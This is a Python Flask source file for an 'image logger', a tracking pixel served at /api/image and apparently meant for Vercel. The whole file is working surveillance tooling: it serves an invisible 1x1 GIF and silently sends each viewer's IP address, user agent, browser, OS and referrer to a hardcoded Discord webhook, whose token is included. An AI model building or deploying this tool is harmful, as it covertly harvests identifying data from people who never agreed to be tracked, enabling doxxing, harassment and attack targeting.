from flask import Flask, send_file, request, make_response
import httpagentparser
import requests
import os
import datetime

app = Flask(__name__)

# === CONFIG ===
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518983533526257777/LoIZ6BCnbo1pvKd2Yj0gmOzo-AZfpwSLergw8OmHtfNNgLB6N7bmJ2ahgOwi_m9kN9Q-"  # Replace with your Discord webhook URL
IMAGE_PATH = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmYYf8pMfwHc3LO9n8JqyQmVMvbpFQl15eeA&s"  # Put any transparent 1x1 PNG here or use bytes

# Create a simple 1x1 transparent PNG if not present (in memory)
def get_logger_image():
    # 1x1 transparent GIF (works better for logging)
    transparent_gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    return transparent_gif

@app.route('/api/image', methods=['GET'])
def serve_image():
    # Collect all info
    ip = request.remote_addr or request.headers.get('X-Forwarded-For', 'Unknown')
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'No referrer')
    timestamp = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    
    # Parse User Agent
    try:
        parsed_ua = httpagentparser.detect(user_agent)
        browser = parsed_ua.get('browser', {}).get('name', 'Unknown')
        os_name = parsed_ua.get('os', {}).get('name', 'Unknown')
        device = parsed_ua.get('device', 'Unknown')
    except:
        browser = os_name = device = "Parse Error"

    # Log to console (Vercel logs)
    print(f"[IMAGE LOGGER] {timestamp} | IP: {ip} | UA: {user_agent} | Browser: {browser} | OS: {os_name}")

    # Send rich embed to Discord
    embed = {
        "title": "🖼️ Image Logger Triggered",
        "color": 0x00ff00,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "fields": [
            {"name": "IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "Browser", "value": f"`{browser}`", "inline": True},
            {"name": "OS / Device", "value": f"`{os_name} - {device}`", "inline": True},
            {"name": "User-Agent", "value": f"```{user_agent[:500]}```", "inline": False},
            {"name": "Referrer", "value": f"`{referrer}`", "inline": False},
            {"name": "Time", "value": timestamp, "inline": False}
        ]
    }

    payload = {
        "content": f"**New view from `{ip}`**",
        "embeds": [embed]
    }

    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass  # Fail silently

    # Serve the transparent image
    response = make_response(get_logger_image())
    response.headers.set('Content-Type', 'image/gif')
    response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
    response.headers.set('Pragma', 'no-cache')
    return response

# For Vercel serverless
if __name__ == '__main__':
    app.run()
